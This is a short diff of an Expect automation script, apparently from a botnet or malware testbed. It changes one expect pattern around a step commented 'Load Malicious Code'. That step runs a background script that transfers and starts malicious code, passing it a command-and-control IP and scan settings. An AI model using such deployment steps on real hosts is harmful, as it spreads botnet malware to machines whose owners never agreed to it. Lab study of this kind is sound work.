@@ -38,7 +38,7 @@ close $outputTimeFile
 # Load Malicious Code
 expect "*debug# "
 send "nohup python3 $path/$transferAndStartMalicious $CNC_ip $input_bot $scan_flag $path/$pids_file &\r"
-expect "output to 'nohup.out'"
+expect "*output to 'nohup.out'"
 send "\r"
 
 expect "*debug# "
